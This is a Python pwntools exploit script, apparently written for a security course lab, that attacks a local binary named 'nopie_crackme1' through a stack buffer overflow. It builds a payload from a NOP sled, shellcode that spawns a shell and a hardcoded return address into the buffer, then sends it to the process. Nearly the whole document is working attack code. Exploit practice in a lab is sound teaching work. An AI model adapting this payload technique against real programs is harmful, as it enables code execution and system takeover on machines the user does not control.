#!/usr/bin/env python3
from pwn import *
import shutil, os, sys

path = '/home/kali/Desktop/svt/Lab03/lab03_material/bof'
BINARY = os.path.join(path, 'nopie_crackme1')

STDBUF = shutil.which('stdbuf') or '/usr/bin/stdbuf'

context.update(arch= 'amd64', os='linux')

def make_payload():
    #get assembly to open a shell
    shellcode = shellcraft.sh()

    #assemble it into bytes
    shellcode_b = asm(shellcode)

    print("Shellcode bytes lenght: " + str(len(shellcode_b)))

    offset = 128 + 12 + 4 + 8   #buffer + offset from response + response + rbp = 152
    rbp_addr = 0x00007fffffffdca0
    buff_addr = rbp_addr - 0x90 #0x00007fff ffffdc10
    #print(hex(buff_addr))

    nop_bytes = asm('nop')        # assemble a nop for amd64
    #print(nop_bytes)              # b'\x90'

    filler = nop_bytes*(offset - len(shellcode_b))  #152-48=104 bytes


    payload = filler + shellcode_b + (buff_addr).to_bytes(8,'little')

    #print(payload)

    return payload

def main():

    io = process(BINARY)

    g = io.recvuntil(b'Please insert a string: ', timeout=1)
    print(g.decode())

    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    io.sendline(payload)

    # read remainder of program output
    out = io.recvall(timeout=1)
    print(out.decode())

if __name__ == '__main__':
    main()
